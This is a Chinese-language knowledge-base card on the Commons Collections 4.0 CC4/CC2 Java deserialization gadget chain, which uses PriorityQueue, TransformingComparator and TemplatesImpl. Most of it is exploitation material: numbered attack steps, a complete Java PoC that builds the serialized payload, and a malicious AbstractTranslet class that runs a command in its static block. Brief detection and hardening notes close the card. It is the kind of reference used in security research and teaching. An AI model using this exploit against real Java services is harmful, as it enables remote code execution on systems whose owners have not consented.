---
id: web-java-deser-commonscollections-cc4-priorityqueue-templatesimpl
title: CC4/CC2 PriorityQueue + TransformingComparator 触发 TemplatesImpl 字节码
type: scenario
domain: web
path: web/java/deserialization/comparator
technique: cc4-priorityqueue-transformingcomparator-templatesimpl
tags:
- java
- deserialization
- gadget
- commons-collections4
- cc4
- cc2
- priorityqueue
- transformingcomparator
- templatesimpl
cve: []
severity: high
confidence: high
status: verified
affected_versions: Commons Collections 4.0；JDK <= 8u65（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:23:27+08:00'
  notes: 已修正并复核：卡内已改为“Commons Collections 4.1+ 移除 InvokerTransformer 的 Serializable，4.0 仍实现 Serializable”，与 commons-collections4-4.0/4.1 实际类声明一致；CC4/CC2 触发链、size=2、queue={TrAXFilter.class,null} 与原文一致
url: /docs/web/java/deserialization/comparator/web-java-deser-commonscollections-cc4-priorityqueue-templatesimpl/
draft: false
kb_aliases:
- CC4
- CC2
- PriorityQueue TransformingComparator
- Commons Collections 4
- TemplatesImpl PriorityQueue
---

## 一句话结论

在 Commons Collections 4.0（JDK <= 8u65）中，`PriorityQueue.readObject()` 重建堆时调用 `TransformingComparator.compare()`，后者对队列元素执行 `Transformer.transform()`；用 `ConstantTransformer(TrAXFilter.class)` + `InstantiateTransformer(Templates, templates)` 即可构造 `TrAXFilter` 并触发 `TemplatesImpl.newTransformer()` 加载恶意字节码。

## 原理

- Commons Collections 4.1+ 移除了 `InvokerTransformer` 的可序列化能力（4.0 仍实现 Serializable），但提供了 `TransformingComparator`：`compare(o1,o2)` 会对两个参数分别调用 `transformer.transform(...)`，再比较结果。
- `PriorityQueue.readObject()` 读取元素后调用 `heapify()`；`heapify()` 对每个非叶节点调用 `siftDown()`；`siftDown()` 在 comparator 非空时调用 `siftDownUsingComparator()`，进而调用 `comparator.compare(...)`。因此只要队列的 comparator 是可控的 `TransformingComparator`，反序列化时就会执行 transform。
- CC4 的攻击目标沿用 CC3：`ConstantTransformer(TrAXFilter.class)` 返回 Class；`InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})` 调用 `TrAXFilter` 的公有构造器。`TrAXFilter` 构造函数内部执行 `templates.newTransformer()`，进入 `TemplatesImpl.getTransletInstance()` → `defineTransletClasses()` → 加载 `_bytecodes` 中的类并执行静态初始化。
- `TemplatesImpl` 需要反射设置 `_name`（非空）、`_bytecodes`（二维字节数组）、`_tfactory`（`TransformerFactoryImpl` 实例）；恶意类必须继承 `AbstractTranslet`，否则 `defineTransletClasses` 找不到主 translet。
- 时序细节：`PriorityQueue` 的 `size` 必须 >= 2，`heapify` 才会进入 `siftDown` 循环；原文通过反射直接设置 `size=2`。队列元素可为 null，因为 `ConstantTransformer` 忽略输入并返回 `TrAXFilter.class`。
- CC2 是 CC4 的变体：不再用 `ChainedTransformer` 串联，而是直接把 `InstantiateTransformer` 作为 comparator；此时 `transform` 的输入必须是 `Class`，所以要把 `queue` 设置为 `{TrAXFilter.class, null}`，让 `compare` 把 `TrAXFilter.class` 传给 `InstantiateTransformer`。

## 触发条件

- Commons Collections 4.0（原文；4.1+ 的 `InvokerTransformer` 不可序列化，4.0 仍可序列化，`TransformingComparator` 可用）。
- JDK <= 8u65，内部 Xalan `TemplatesImpl`/`TrAXFilter` 可反射访问（JDK 17+ 模块封装后需改用外部 Xalan 或其它 sink）。
- 目标存在 Java 原生反序列化入口，未过滤 `PriorityQueue`、`TransformingComparator`、`TrAXFilter`、`TemplatesImpl`。
- 攻击侧可用 Javassist/ASM 生成继承 `AbstractTranslet` 的字节码。

## 利用步骤

1. 生成继承 `AbstractTranslet` 的恶意类，在静态初始化块写入命令，取 `toBytecode()`。
2. 构造 `TemplatesImpl`，反射设置 `_name`、`_bytecodes`、`_tfactory`。
3. 构造 `ConstantTransformer(TrAXFilter.class)` + `InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})`，再包成 `ChainedTransformer`（CC4）。
4. 用该 `ChainedTransformer` 构造 `TransformingComparator`，放入 `PriorityQueue`。
5. 反射设置 `PriorityQueue.size = 2`（CC4 元素可为 null；CC2 还需设置 `queue={TrAXFilter.class,null}`）。
6. 序列化 `PriorityQueue` 并发送到目标反序列化入口。

## PoC

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "test");
        setField(templates, "_bytecodes",
            new byte[][]{Files.readAllBytes(Paths.get("Evil.class"))});
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer[] ts = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                new Class[]{Templates.class},
                new Object[]{templates})
        };
        ChainedTransformer chain = new ChainedTransformer(ts);

        TransformingComparator cmp = new TransformingComparator(chain);
        PriorityQueue<Object> queue = new PriorityQueue<>(cmp);

        setField(queue, "size", 2);   // heapify 需要 size >= 2
        // CC4：queue 元素可为 null，ConstantTransformer 忽略输入
        // CC2：InstantiateTransformer 直接作 comparator 时需 setField(queue, "queue", new Object[]{TrAXFilter.class, null});

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(queue);
        }
    }

    static void setField(Object o, String name, Object v) throws Exception {
        Field f = o.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(o, v);
    }
}
```

```text
# 恶意类必须：
#   public class Evil extends AbstractTranslet {
#       static { Runtime.getRuntime().exec("calc"); }
#       public void transform(DOM d, SerializationHandler[] h) {}
#       public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) {}
#   }
```

## 变体与关联

- 变体：CC2 去掉 `ChainedTransformer`，把 `InstantiateTransformer` 直接作为 comparator，并设置 `queue={TrAXFilter.class,null}`，让 compare 的参数成为 transform 的输入。
- 变体：JDK 17+ 内部 Xalan 被模块封装时，改用外部 `xalan:xalan` 的 `TemplatesImpl` 或其它 sink（见外部 Xalan 卡片）。
- 变体：`TransformingComparator` 也可接 `InvokerTransformer`（若可序列化）或其它 Transformer；CC4 只是其中一种组合。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（CC6 触发 + CC3 sink 的组合）；[[web-java-deserialization-external-xalan-templatesimpl-sink]]（JDK 21 外部 Xalan 替代）；[[web-java-deser-comparator-priorityqueue]]（PriorityQueue 比较器触发通用构造）。
- 边界：CC 4.0 之外版本差异、JDK 8u65+ 的 `TemplatesImpl` 可访问性、`size` 未设置导致 heapify 不触发、JEP 290 过滤 `PriorityQueue`/`TemplatesImpl` 时失效。

## 检测与防御

- 检测：序列化流中出现 `PriorityQueue` + `TransformingComparator` + `TrAXFilter`/`TemplatesImpl`；反序列化后加载未知类、执行 `Runtime.exec`。
- 修复：升级 Commons Collections 到无该 gadget 的版本；消除不可信 Java 原生反序列化。
- 加固：JEP 290 `ObjectInputFilter` 白名单，拒绝 `TemplatesImpl`、`TrAXFilter`、`PriorityQueue` 等非业务类；升级 JDK 并限制内部 Xalan 访问。
